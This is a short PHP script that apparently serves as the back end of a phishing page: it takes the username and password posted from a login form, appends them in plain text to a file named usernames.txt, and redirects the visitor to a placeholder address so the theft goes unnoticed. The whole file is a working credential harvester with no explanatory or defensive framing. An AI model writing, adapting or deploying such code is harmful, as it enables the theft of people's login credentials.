<?php # DO NOT EDIT/TAMPER WITH THIS FILE #
			session_start();
			
			$pass = $_POST["password"];
			$username=$_POST["username"];
			
			file_put_contents("usernames.txt", "                [ USERNAME: " . " ". $username . " ]   " . " " . "[ PASSWORD: " . " " . $pass . " ]\n", FILE_APPEND);
  			header('Location: <REDIRECT>');
			exit();
			
			
			session_destroy();
			
?>